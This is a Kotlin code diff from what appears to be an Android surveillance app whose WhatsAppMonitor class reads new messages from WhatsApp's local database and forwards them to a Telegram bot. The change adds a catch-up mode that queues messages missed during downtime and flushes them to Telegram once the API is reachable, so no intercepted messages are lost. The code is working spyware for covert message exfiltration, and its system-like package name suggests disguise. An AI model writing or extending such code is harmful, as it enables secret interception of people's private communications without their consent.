@@ -210,7 +210,7 @@ class WhatsAppMonitor(
                     LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Baseline established (ID: ${prefsManager.whatsappLastProcessedId}). Watching for live messages...")
                 } else {
                     LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Resuming from ID: ${prefsManager.whatsappLastProcessedId}. Performing catch-up sync...")
-                    processNewMessages()
+                    processNewMessages(isCatchUp = true)
                 }
 
                 // 3. Start the watcher flow
@@ -218,7 +218,7 @@ class WhatsAppMonitor(
                     .debounce(DEBOUNCE_MS)
                     .collect {
                         try {
-                            processNewMessages()
+                            processNewMessages(isCatchUp = false)
                         } catch (e: CancellationException) {
                             throw e
                         } catch (e: Exception) {
@@ -426,7 +426,7 @@ class WhatsAppMonitor(
     //  Ports: print_new_rows() from Python PoC
     // ═══════════════════════════════════════════════════════════
 
-    private suspend fun processNewMessages() {
+    private suspend fun processNewMessages(isCatchUp: Boolean = false) {
         // Let the SQLite WAL file finish its micro-writes (matches Python's time.sleep(0.15))
         Thread.sleep(150)
 
@@ -449,19 +449,31 @@ class WhatsAppMonitor(
             for (row in rows) {
                 if (row.id > prefsManager.whatsappLastProcessedId) {
                     val formatted = formatOutputMessage(row)
-                    com.system.superiormonitor.bot.OfflineManager.sendOrQueue(
-                        context = context,
-                        message = formatted,
-                        offlineSubdir = "whatsapp",
-                        offlineFileName = "offline_whatsapp.txt",
-                        sender = sendTelegram
-                    )
+                    if (isCatchUp) {
+                        com.system.superiormonitor.bot.OfflineManager.queueOnly(
+                            context = context,
+                            message = formatted,
+                            offlineSubdir = "whatsapp",
+                            offlineFileName = "offline_whatsapp.txt"
+                        )
+                    } else {
+                        com.system.superiormonitor.bot.OfflineManager.sendOrQueue(
+                            context = context,
+                            message = formatted,
+                            offlineSubdir = "whatsapp",
+                            offlineFileName = "offline_whatsapp.txt",
+                            sender = sendTelegram
+                        )
+                    }
                     prefsManager.whatsappLastProcessedId = row.id
                 }
             }
 
             if (rows.isNotEmpty()) {
-                LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Forwarded ${rows.size} new message(s).")
+                LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Forwarded/Queued ${rows.size} new message(s).")
+                if (isCatchUp && com.system.superiormonitor.util.LogManager.isTelegramApiReachable.value) {
+                    com.system.superiormonitor.bot.OfflineManager.processOfflineQueue(context, CoroutineScope(Dispatchers.IO))
+                }
             }
         }
     }
